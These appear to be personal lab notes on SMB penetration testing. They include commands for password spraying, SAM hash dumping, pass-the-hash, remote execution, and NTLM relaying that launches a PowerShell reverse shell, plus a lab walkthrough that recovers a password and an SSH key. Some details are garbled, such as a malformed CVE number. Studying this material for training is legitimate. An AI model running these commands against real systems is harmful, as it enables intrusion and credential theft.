# Basic Information
SMB while having shares can you the MSRPC possible to execute code from the outside
When doing an nmap scan the output should look like this
Version = Samba smbd 4.6.2
Netbios or hostname = HTB
Operating system = linux based

# Tools
### SMBCLIENT
`smbclient -N -L //10.10.10.10`
### SMBMAP
`smbmap -H 10.10.10.10 -r notes` This will recursively look throught the files of the notes share
Adding the `--download "notes\note.txt"` will copy the file to the attack box same thing with `--upload`
### RPCCLIENT
`rpcclient -U'%' 10.10.10.10`
[CheatSheet](willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)
### ENUM4LINUX
`./enum4linux-ng.py 10.10.10.10 -A -C`
- Workgroup/Domain name
- Users information
- Operating system information
- Groups information
- Shares Folders
- Password policy information

# BruteForcing
### Crackmap/Netexec
First you can make a file of all the users you have be able to find on the system
`crackmapexec smb 10.10.10.10 -u /list.txt -p 'Company10!' --local-auth`
The local auth is for non-domain joined systems
Or you can use the command below to do something much like the impacket.
`crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`
For machines withh the same local administrator account we can use this to find logged on users
`crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`
To dump any SAM hashes one can you the --sam function
`crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`
### Impacket - PSexec
`impacket-psexec administrator:'password'@10.10.10.10`
### PassTheHash
Also using the tools above, one can use the hashes found to crack into accounts and or find new ones
`crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`
# Forced Authentication Attacks
### Responder
`responder -I interface_name`
After popping possible usernames and hashes, one can use the `hashcat -m 5600` to crack the hashes
If you cannot crack the hash you can possible pass the hash relay with `impacket`

First turn off SMB `cat /etc/responder/Responder.conf | grep 'SMB ='`
Then it is time to launch the `impacket`
`impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`
Or can use a powershell reverse shell by using then use netcat to connect to it
`impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e FullHash'`
`nc -lvnp 4444`

# Mini Lab
 What is the name of the shared folder with READ permissions?
`nmap -sC -sV -v 10.129.203.6`
![[Pasted image 20260113205748.png]]
After the scan I found this in the host script results
`nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)`

Running the SMBclient command was able to see some of the shares of the company.
`smbclient -N -L 10.129.203.6`
![bbe3c187646a81625e42b56688839ff0.png](:/10b7bf348b564dceb6f5ba47df5976f7)
The answer was `GGJ`
Digging further...
![9f6bd3ae0ccd6e4ee83d53ed72b50715.png](:/2944d0d6633441c2a52629f6e37fca5d)

What is the password for the username "jason"?
Taking the password file given in the resouces of the module made a password list and used crackmap to execute.
`crackmapexec smb 10.129.203.6 -u jason -p passwordlist.txt --local-auth`
Results: `ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh`
![4ad08a12608ca8ff1a92e333dece7568.png](:/f217d857512147c2803d649a65705c3c)
After that I am able to possibly access the smb shares again
`smbclient --user jason //10.126.203.6`
Then his hash for the password
![0b190c71852c5b778f99e65ff1bb3096.png](:/61bb2e8b3e3c45d2821df04ffda074fd)
Now I can ssh into the box possibly
Using `get id_rsa`
`chmod 400 id_rsa`
`ssh jason@10.129.203.6 -i id_rsa`

Then simply cat the flag.

# Other Vulns
SMB Ghost, CVE-202-0796
